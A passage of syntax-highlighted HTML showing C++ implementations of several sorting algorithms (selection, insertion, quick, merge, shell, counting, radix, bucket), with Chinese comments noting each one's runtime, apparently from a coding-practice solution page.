punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> count<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token 